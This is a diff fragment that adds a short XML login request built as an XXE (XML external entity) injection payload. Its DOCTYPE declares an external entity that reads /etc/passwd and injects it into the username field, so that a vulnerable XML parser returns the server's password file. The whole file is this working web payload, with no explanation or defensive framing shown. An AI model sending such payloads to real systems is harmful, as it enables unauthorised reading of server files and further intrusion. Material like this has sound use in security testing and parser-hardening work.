@@ -1,0 +1,10 @@
+<!DOCTYPE login [
+        <!ELEMENT login ANY >
+        <!ELEMENT username ANY>
+        <!ELEMENT password ANY>
+        <!ENTITY xxe SYSTEM "file:///etc/passwd" >
+        ]>
+<login>
+    <username>&xxe;</username>
+    <password>password</password>
+</login>
